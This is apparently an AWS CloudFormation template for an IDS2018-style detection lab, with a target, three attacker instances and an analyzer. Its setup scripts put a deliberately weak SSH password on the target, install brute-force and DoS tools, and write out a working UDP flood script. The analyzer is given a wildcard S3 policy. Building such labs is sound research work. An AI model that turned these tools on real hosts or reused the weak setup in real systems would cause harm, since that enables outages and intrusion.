AWSTemplateFormatVersion: '2010-09-09'
Description: >
  IDS2018 Testing - Step 2: EC2 Instances (5 total)
  3 Attackers + 1 Target + 1 Analyzer (private subnet, SSM access)

Parameters:
  ProjectName:
    Type: String
    Default: ids2018-test

  InstanceAmiId:
    Type: AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>
    Default: /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64

  AnalyzerInstanceType:
    Type: String
    Default: t3.medium
    Description: Analyzer needs more RAM for CICFlowMeter + model inference

  AttackerInstanceType:
    Type: String
    Default: t3.small
    Description: Attackers need moderate CPU for DoS tools

  TargetInstanceType:
    Type: String
    Default: t3.small
    Description: Target needs to handle multiple attack types

Resources:
  # --- IAM Roles ---
  SSMRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub ${ProjectName}-ssm-role
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: ec2.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore

  AnalyzerRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub ${ProjectName}-analyzer-role
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: ec2.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
      Policies:
        - PolicyName: S3FullAccess
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action: s3:*
                Resource: '*'

  SSMProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Roles: [!Ref SSMRole]

  AnalyzerProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Roles: [!Ref AnalyzerRole]

  # ============================================================
  # TARGET SERVER — SSH + HTTP + FTP (menerima semua jenis attack)
  # ============================================================
  TargetServer:
    Type: AWS::EC2::Instance
    Properties:
      InstanceType: !Ref TargetInstanceType
      ImageId: !Ref InstanceAmiId
      SubnetId:
        Fn::ImportValue: !Sub ${ProjectName}-private-subnet-id
      SecurityGroupIds:
        - Fn::ImportValue: !Sub ${ProjectName}-instance-sg-id
      IamInstanceProfile: !Ref SSMProfile
      UserData:
        Fn::Base64: |
          #!/bin/bash
          yum update -y
          # SSH: enable password auth
          useradd -m testuser && echo "testuser:P@ssw0rd123" | chpasswd
          sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
          systemctl restart sshd
          # HTTP: install nginx (target for DoS HTTP attacks)
          yum install -y nginx
          systemctl enable nginx && systemctl start nginx
          # FTP: install vsftpd (target for FTP brute-force)
          yum install -y vsftpd
          echo "local_enable=YES" >> /etc/vsftpd/vsftpd.conf
          systemctl enable vsftpd && systemctl start vsftpd
          echo "Target setup complete" > /tmp/setup.log
      Tags:
        - Key: Name
          Value: !Sub ${ProjectName}-target
        - Key: Role
          Value: target

  # ============================================================
  # ATTACKER-1: Brute-Force (SSH + FTP)
  # Tools: Hydra, Medusa, Ncrack
  # ============================================================
  Attacker1BruteForce:
    Type: AWS::EC2::Instance
    Properties:
      InstanceType: !Ref AttackerInstanceType
      ImageId: !Ref InstanceAmiId
      SubnetId:
        Fn::ImportValue: !Sub ${ProjectName}-private-subnet-id
      SecurityGroupIds:
        - Fn::ImportValue: !Sub ${ProjectName}-instance-sg-id
      IamInstanceProfile: !Ref SSMProfile
      UserData:
        Fn::Base64: |
          #!/bin/bash
          yum update -y
          yum install -y gcc make openssl-devel libssh-devel pcre-devel
          # Install Hydra
          cd /tmp
          curl -sL -o hydra.tar.gz https://github.com/vanhauser-thc/thc-hydra/archive/refs/tags/v9.5.tar.gz
          tar xzf hydra.tar.gz && cd thc-hydra-9.5
          ./configure && make && make install
          # Install Medusa
          yum install -y medusa 2>/dev/null || true
          # Install Nmap (for service scan)
          yum install -y nmap
          # Password/username lists
          mkdir -p /opt/attack
          curl -sL -o /opt/attack/passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
          echo -e "admin\nroot\ntestuser\nuser\nubuntu\nec2-user\nftp" > /opt/attack/usernames.txt
          echo "Attacker-1 (BruteForce) setup complete" > /opt/attack/setup.log
      Tags:
        - Key: Name
          Value: !Sub ${ProjectName}-attacker1-bruteforce
        - Key: Role
          Value: attacker
        - Key: AttackType
          Value: brute-force

  # ============================================================
  # ATTACKER-2: DoS (Application Layer)
  # Tools: Slowloris, GoldenEye, SlowHTTPTest
  # ============================================================
  Attacker2DoS:
    Type: AWS::EC2::Instance
    Properties:
      InstanceType: !Ref AttackerInstanceType
      ImageId: !Ref InstanceAmiId
      SubnetId:
        Fn::ImportValue: !Sub ${ProjectName}-private-subnet-id
      SecurityGroupIds:
        - Fn::ImportValue: !Sub ${ProjectName}-instance-sg-id
      IamInstanceProfile: !Ref SSMProfile
      UserData:
        Fn::Base64: |
          #!/bin/bash
          yum update -y
          yum install -y python3 python3-pip git
          # Install Slowloris
          pip3 install slowloris
          # Install GoldenEye
          cd /opt && git clone https://github.com/jseidl/GoldenEye.git
          # Install SlowHTTPTest
          yum install -y gcc-c++ openssl-devel
          cd /tmp
          curl -sL -o slowhttptest.tar.gz https://github.com/shekyan/slowhttptest/archive/refs/tags/v1.9.0.tar.gz
          tar xzf slowhttptest.tar.gz && cd slowhttptest-1.9.0
          ./configure && make && make install 2>/dev/null || true
          # Install ab (Apache Bench) for HTTP flood (Hulk-like)
          yum install -y httpd-tools
          mkdir -p /opt/attack
          echo "Attacker-2 (DoS) setup complete" > /opt/attack/setup.log
      Tags:
        - Key: Name
          Value: !Sub ${ProjectName}-attacker2-dos
        - Key: Role
          Value: attacker
        - Key: AttackType
          Value: dos

  # ============================================================
  # ATTACKER-3: DDoS (Volumetric / Network Layer)
  # Tools: hping3, LOIC-alternative, SYN flood
  # ============================================================
  Attacker3DDoS:
    Type: AWS::EC2::Instance
    Properties:
      InstanceType: !Ref AttackerInstanceType
      ImageId: !Ref InstanceAmiId
      SubnetId:
        Fn::ImportValue: !Sub ${ProjectName}-private-subnet-id
      SecurityGroupIds:
        - Fn::ImportValue: !Sub ${ProjectName}-instance-sg-id
      IamInstanceProfile: !Ref SSMProfile
      UserData:
        Fn::Base64: |
          #!/bin/bash
          yum update -y
          yum install -y gcc make libpcap-devel
          # Install hping3 (SYN flood, UDP flood)
          cd /tmp
          git clone https://github.com/antirez/hping.git 2>/dev/null || yum install -y hping3
          cd hping && ./configure && make && make install 2>/dev/null || true
          # Install nping (bagian dari nmap)
          yum install -y nmap-ncat nmap
          # Install python3 for custom flood scripts
          yum install -y python3 python3-pip
          pip3 install scapy
          mkdir -p /opt/attack
          # Custom UDP flood script
          cat > /opt/attack/udp_flood.py << 'EOF'
          #!/usr/bin/env python3
          import socket, sys, time, random
          target = sys.argv[1]
          port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
          duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          end_time = time.time() + duration
          count = 0
          while time.time() < end_time:
              sock.sendto(random._urandom(1024), (target, port))
              count += 1
          print(f"Sent {count} UDP packets in {duration}s")
          EOF
          chmod +x /opt/attack/udp_flood.py
          echo "Attacker-3 (DDoS) setup complete" > /opt/attack/setup.log
      Tags:
        - Key: Name
          Value: !Sub ${ProjectName}-attacker3-ddos
        - Key: Role
          Value: attacker
        - Key: AttackType
          Value: ddos

  # ============================================================
  # ANALYZER — CICFlowMeter + Model Inference + Result Logging
  # ============================================================
  AnalyzerNode:
    Type: AWS::EC2::Instance
    Properties:
      InstanceType: !Ref AnalyzerInstanceType
      ImageId: !Ref InstanceAmiId
      SubnetId:
        Fn::ImportValue: !Sub ${ProjectName}-private-subnet-id
      SecurityGroupIds:
        - Fn::ImportValue: !Sub ${ProjectName}-instance-sg-id
      IamInstanceProfile: !Ref AnalyzerProfile
      UserData:
        Fn::Base64: |
          #!/bin/bash
          yum update -y
          # Java (CICFlowMeter requirement)
          yum install -y java-17-amazon-corretto
          # Python + ML libs
          yum install -y python3 python3-pip
          pip3 install boto3 pandas numpy xgboost scikit-learn matplotlib
          # Packet capture
          yum install -y tcpdump libpcap tshark
          # CICFlowMeter directory
          mkdir -p /opt/cicflowmeter
          mkdir -p /opt/ids2018/{models,results,logs,schedule}
          echo "Analyzer setup complete" > /opt/ids2018/setup.log
      Tags:
        - Key: Name
          Value: !Sub ${ProjectName}-analyzer
        - Key: Role
          Value: analyzer

Outputs:
  TargetIp:
    Value: !GetAtt TargetServer.PrivateIp
    Export:
      Name: !Sub ${ProjectName}-target-ip
  Attacker1Ip:
    Value: !GetAtt Attacker1BruteForce.PrivateIp
    Export:
      Name: !Sub ${ProjectName}-attacker1-ip
  Attacker2Ip:
    Value: !GetAtt Attacker2DoS.PrivateIp
    Export:
      Name: !Sub ${ProjectName}-attacker2-ip
  Attacker3Ip:
    Value: !GetAtt Attacker3DDoS.PrivateIp
    Export:
      Name: !Sub ${ProjectName}-attacker3-ip
  AnalyzerIp:
    Value: !GetAtt AnalyzerNode.PrivateIp
    Export:
      Name: !Sub ${ProjectName}-analyzer-ip
  TargetId:
    Value: !Ref TargetServer
  Attacker1Id:
    Value: !Ref Attacker1BruteForce
  Attacker2Id:
    Value: !Ref Attacker2DoS
  Attacker3Id:
    Value: !Ref Attacker3DDoS
  AnalyzerId:
    Value: !Ref AnalyzerNode
